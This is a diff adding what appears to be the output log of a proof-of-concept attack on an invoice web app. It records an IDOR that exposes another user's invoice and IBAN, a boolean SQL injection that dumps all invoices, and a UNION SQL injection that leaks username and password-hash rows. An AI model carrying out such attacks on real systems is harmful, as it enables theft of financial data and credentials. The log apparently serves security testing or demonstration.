@@ -1,0 +1,17 @@
+== login as bob (id 2) ==
+200 OK {'token': 'vfuxqLvAL5HQC2TCPU83vCg3O4VgvPFo5Y8E5vNR69Q'}
+
+== bob requests /invoices/1 (owner is alice, id 1) ==
+200 OK {'id': 1, 'owner_id': 1, 'customer': 'Acme Ltd', 'amount': 1200.0, 'iban': 'DE00 0000 0000 0000 0000 01'}
+IDOR: bob read alice's invoice incl IBAN: DE00 0000 0000 0000 0000 01
+
+== bob's own /invoices listing (baseline, owner-scoped) ==
+200 OK [{'id': 2, 'customer': 'Globex', 'amount': 830.5}]
+
+== /search with boolean SQLi payload (dump all owners' invoices) ==
+200 OK [{'id': 1, 'customer': 'Acme Ltd', 'amount': 1200.0}, {'id': 2, 'customer': 'Globex', 'amount': 830.5}]
+rows returned: 2 invoice ids: [1, 2]
+
+== /search with UNION SQLi payload (dump credential store) ==
+200 OK [{'id': 1, 'customer': 'alice:D867C410728CF568B5839F001DBBE96E6C41DE93A0F040F166A53E8A51198C38C01349EA0D9AFB9E7328376D4B5C6FB1C5AD0A9DB2123E815B8721BB7544C3E8', 'amount': 0}, {'id': 2, 'customer': 'Globex', 'amount': 830.5}, {'id': 2, 'customer': 'bob:35B47A9D00D002AF150AF4932EC767D7A841CEA9832EAC56137AC1259AE84D1A85804DE379265928845203DEB64E219A80F32C5D14EC6666F358267C236F4823', 'amount': 0}]
+leaked credential rows: ['alice:D867C410728CF568B5839F001DBBE96E6C41DE93A0F040F166A53E8A51198C38C01349EA0D9AFB9E7328376D4B5C6FB1C5AD0A9DB2123E815B8721BB7544C3E8', 'bob:35B47A9D00D002AF150AF4932EC767D7A841CEA9832EAC56137AC1259AE84D1A85804DE379265928845203DEB64E219A80F32C5D14EC6666F358267C236F4823']
